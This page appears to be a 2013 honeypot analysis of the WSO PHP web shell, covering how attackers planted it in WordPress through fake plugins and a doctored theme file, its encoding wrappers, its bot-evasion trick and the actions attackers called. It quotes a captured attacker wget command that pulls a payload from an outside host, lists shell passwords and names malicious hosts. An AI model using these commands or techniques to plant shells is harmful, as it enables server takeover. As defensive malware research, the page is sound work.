@@ -1,0 +1,258 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<title>PHParasites:  WordPress Malware</title>
+<meta name="google-site-verification" content="ixC4wtdetOlWNosRSwl6CFgRutGwfbq_9r9z534uRkY" />
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<style type="text/css">
+html,body{margin:0;padding:0}
+body{font: 76% arial,sans-serif}
+p{margin:0 10px 10px}
+div#header h1{height:80px;line-height:80px;margin:0; padding-left:10px;background: #EEE;color: #79B30B}
+div#subheader h2{height:15px;line-height:15px;margin:5px; padding-left:10px;color: #79B30B}
+div#subsubheader h3{height:10px;line-height:10px;margin:5px; padding-left:12px;color: #79B30B}
+div#content p{line-height:1.4}
+div#content pre{line-height:1.4;margin:5px;font:100% courier;}
+div#content kbd{font:100% courier;}
+div#content table{margin:10px;}
+div#navigation{background:#B9CAFF}
+div#extra{background:#FF8539}
+div#footer{background: #333;color: #FFF}
+div#footer p{margin:0;padding:5px 10px}
+div#wrapper{float:left;width:100%}
+div#content{margin: 0 25%}
+div#navigation{float:left;width:25%;margin-left:-100%}
+div#extra{float:left;width:25%;margin-left:-25%}
+div#footer{clear:left;width:100%}
+</style>
+</head>
+<body>
+<div id="container">
+<div id="header">
+	<h1>PHParasites:  WordPress Malware</h1>
+</div>
+<div id="wrapper">
+<div id="content">
+<div id="subheader"><h2>WSO Web Shell</h2></div>
+<p>
+"WSO" apparently stands for "Web Shell by orb", a note that sometimes appears 
+in WSO source code. The WSO Web Shell provides a system
+administration and hacking console to those who know its URL.
+It's also apparently known as the <a href="http://labs.sucuri.net/db/malware/backdoor-phpfilesman02">FilesMan</a>
+backdoor, even though it's a good deal more than a mere backdoor.
+</p>
+<p>
+WSO requires a password for further access. Passwords sent along to various
+WSO instances:
+'4500045', 'nhzgrf', 'aspx12', 'FDY17c', 'gatamorgana'
+The password gets run through <kbd>md5()</kbd> and compared to a string
+literal in the source code. These string literals often appear
+on the web: googling for any of them gets you the corresponding plain-text
+password.
+</p>
+<!--
+<p>
+'gatamorgana' password used by <kbd>mod_twit.php</kbd>, WSO v2.4.
+Obfuscated by <kbd>preg_replace("/.*/e","\x65\x7...",".");</kbd>,
+executing "\xNN"-encoded PHP string. The "\xNN"-encoded string
+ends up as the old <kbd>eval(gzinflate(base64_decode"..."));</kbd>.
+So this one has two levels of encoding and evaluation of the WSO source.
+This was uploaded twice, as a plugin by 178.158.214.36
+</p>
+<p>
+Password 'FDY17c' used by WSO 2.5, uploaded as a plugin by 193.17.208.89.
+Password 'aspx12' corresponds to a WSO v2.5, uploaded as a plugin
+by 2.132.141.89.  Nothing other than the MD5 hash of the password differs
+in these two source files.
+</p>
+-->
+<p>
+Versions 2.4, 2.5, 2.5.1 and 3.1 all got downloaded by honey pot users,
+although it's not clear to me that "orb" or even a single entity maintains
+the versioning.
+</p>
+<div id="subsubheader"><h3>Method of Installation</h3></div>
+<p>
+Usually, WSO gets downloaded as just another PHP file in a 
+WordPress plugin. Although the name of the WSO PHP file 
+in the plugin zip-file varies
+(<kbd>mod_googleapi.php</kbd>, <kbd>config.php</kbd>,<kbd>mod_te.php</kbd>,
+<kbd>mod_system.php</kbd> and many others get used),
+the plugin used always claims to be a "Tumblr Importer".
+The rest of the files from plugin zip files captured by my honey pot
+appear identical in all plugin downloads.
+</p>
+<p>
+On occasion, an attacker tried to download the single, unzipped
+".php" file of WSO source code as a plugin. This does not work on any
+verion of WordPress I have tried, but my honey pot appears to allow it.
+Possibly these attackers would have tried again, with a zip-file.
+Due to emulation more permissive than reality, they didn't need to.
+Since a single ".php" file doesn't work as a plugin in real WordPress,
+I have to wonder why the attackers even bother to try this.
+</p>
+<p>
+One WSO shell got downloaded as the <kbd>rtl.css</kbd> file in the
+default theme. The downloader used the <kbd>theme-editor.php</kbd>
+WordPress file to download, which in the case of my honey pot, contained
+just enough PHP to show HTML for a successful theme edit, and capture
+the downloaded theme edit.
+</p>
+<div id="subsubheader"><h3>Obfuscation</h3></div>
+<p>
+WSO shells change name constantly. The WSO PHP file in the Tumbler importer
+plugin is mostly named <kbd>mod_something.php</kbd>, where "something" is
+"gogle", "googleapi", "te", "twit" or other names. Occasionally WSO shells
+have names like "jm.php", "502.php", "info.php", "error.php", "copyright.php".
+The name changes can only protect against naive human detection.
+</p>
+<p>
+WSO shells used varied source-code obfuscation.
+PHP has to be distributed in source code form, it's interpreted.
+This seems  to cause a lot of variation in obfuscation.
+</p>
+<p>
+Some uploads used <kbd>eval(base64_decode("...");</kbd>
+Other uploads used <kbd>eval(gzinflate(base64_decode("...")));</kbd>
+In both cases, WSO PHP source code has been encoded, and gets
+executed by the <kbd>eval()</kbd> construct.
+</p>
+<p>
+The kinked <kbd>rtl.css</kbd> file did an <kbd>eval(base64_decode("...")</kbd>
+on suitably encoded WSO PHP, but only if <kbd>isset($_GET['pwd'])</kbd>.
+That is, called by an HTTP GET method where the URL contained a 'pwd' named
+value.
+</p>
+<p>
+A few uploads used<kbd>preg_replace("/.*/e","...");</kbd> to execute WSO code.
+The <kbd>preg_replace</kbd> composed and executed a <kbd>
+gzinflate(base64_decode('...');</kbd> construct, making it something of a
+2-layer encoding.  This method avoids the use of the <kbd>eval()</kbd> PHP
+construct, which should almost never appear in code.
+</p>
+<div id="subsubheader"><h3>Run-time Camoflage</h3></div>
+<p>
+WSO returns an HTTP 404 code ("file not found") and corresponding HTML from inside itself
+when the User Agent string has a substring that matches one of
+"Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler".
+This is an attempt to stay out of search engine's index.
+Which doesn't always work: a <a href="https://www.google.com/#q=inurl:mod_gogle.php">search for a common WSO file name</a>
+turns up quite a few instances.
+</p>
+<p>
+The kinked theme had to be called by an HTTP GET
+with a 'pwd' named value in the URL to execute the WSO shell. 
+Called in any other fashion, it would just give
+back the default "kubrick" theme CSS.
+</p>
+<div id="subsubheader"><h3><a name="ACTIONPHP">Primary Uses</a></h3></div>
+<p>
+It's hard to impute motive, but it's easy to look at what WSO
+"actions" get called. A typical WSO file defines about 12
+"action" functions, ranging from a action that runs PHP
+on the web server to self-removal.  My honey pot only caught
+attackers invoking 5 actions.
+</p>
+<table border="1">
+	<tr><th>Action</th><th>Invocation Count</th></tr>
+	<tr><td>Php</td><td align="right">12</td></tr>
+	<tr><td>Console</td><td align="right">1</td></tr>
+	<tr><td>Framer</td><td align="right">18</td></tr>
+	<tr><td>FilesMan</td><td align="right">464</td></tr>
+	<tr><td>FilesTools</td><td align="right">10</td></tr>
+</table>
+<p>
+The "Console" action provides something akin to a remote shell.
+The user types a command, which gets sent to the web server.
+The web server executes the command and sends any results back.
+The single call to the "Console" action tried to run the command:
+</p>
+<pre>wget http://freemoviesbazaar.com/wp-content/uploads/1986/03/b 2&gt;&amp;1</pre>
+<p>
+The "FilesTools" action offers the interactive user a lot of functionality.  At
+least some of the calls appear to be interactive, a human user trying to figure
+out what the WSO emulation had to offer by "downloading" a file from the server
+to the user's machine.
+</p>
+<p>
+One of the "FilesTools" actions was to do a "mkfile" with the name "asas.php".
+This was followed by a "FilesTools" action to edit <kbd>asas.php</kbd>.  The
+"edit" sub-action replaces an existing file's contents. Once replaced,
+<kbd>asas.php</kbd> would have acted as an HTTP proxy, fetching a "links file"
+from manka11.com or manka12342341.com.  My WSO emulation wasn't good enough for
+the "mkfile" and "edit" sub-actions to take place, so I have no idea what sucn
+a links file looks like.  This constitutes yet another way to download code
+onto a server.
+</p>
+<p>
+The "Framer" invocations probably don't work. It seems that someone wanted to
+put a <kbd>&lt;script&gt;</kbd> tag into some files. The
+<kbd>&lt;script&gt;</kbd> source
+<kbd>http://stummann.net/steffen/google-analytics/jquery-1.6.5.min.js</kbd>,
+which looks to contain malicious JavaScript. None of the WSO code I examined in
+detail had an "Framer" action. A "Framer" action might reside in some
+custom-coded piece of a WSO source file I didn't look at.
+</p>
+<div id="subsubheader"><h3>Coding Style</h3></div>
+<p>
+WSO can run under both Windows and Linux, although it has more capability
+under Linux.
+</p>
+<p>
+WSO accomodates different versions of PHP to some extent.
+It doesn't use _REQUEST, it uses explicit _GET and _POST, for example.
+It also tries a rainbow of alternative PHP builtins when trying
+to run external commands.
+</p>
+<p>
+The code seems fairly coherent. As version number increases, the function
+naming becomes more standardized, which would seem to be the work of a
+single programmer.
+</p>
+</div>
+</div>
+
+<div id="navigation">
+<div id="subheader"><h2>Sections</h2></div>
+<ul>
+	<li><a href="index.html">Introduction</a>.</li>
+	<li><a href="details.html">Honey Pot Details</a></li>
+	<li><a href="access.html">Obtaining Access</a></li>
+	<li><a href="comment_spam.html">Spam Posts</a></li>
+	<li>WSO Web Shell</li>
+	<li><a href="login.html">WSO Session Example</a></li>
+	<li><a href="emailers.html">Email Spam Tools</a></li>
+	<li><a href="recon.html">Reconnaissance Tools</a></li>
+	<li><a href="gateway.html">File Retrieval Gateway</a></li>
+	<li><a href="testm.html">Obfuscated Code Champion</a></li>
+	<li><a href="backdoors.html">Back Doors</a></li>
+</ul>
+</div>
+
+<div id="extra">
+<div id="subheader"><h2>Author</h2></div>
+<p>
+<a href="mailto:bediger@stratigery.com">Bruce Ediger</a>, October, 2013.
+</p>
+<div id="subheader"><h2>WSO Example Code</h2></div>
+<p>
+<a href="theme.phps">WSO source hidden in a theme file</a>.
+</p>
+<div id="subheader"><h2>References</h2></div>
+<p>
+<a href="http://shelldown.wordpress.com/">Other PHP web shells</a>.
+</p>
+<p>
+<a href="https://github.com/bediger4000/malware-phylogeny">A WSO family tree</a>.
+</p>
+<p>
+<a href="https://news.netcraft.com/archives/2017/05/18/web-shells-the-criminals-control-panel.html">Netcraft article on web shells</a>.
+</p>
+<p>
+<a href="https://www.wordfence.com/blog/2017/06/wso-shell/">Wordfence article on web shells</a>.
+</p>
+</div>
+<div id="footer"><p>Up to Bruce Ediger's <a style="color:white;" href="/">Web pages</a>.</p></div>
+</div>
+</body>
+</html>
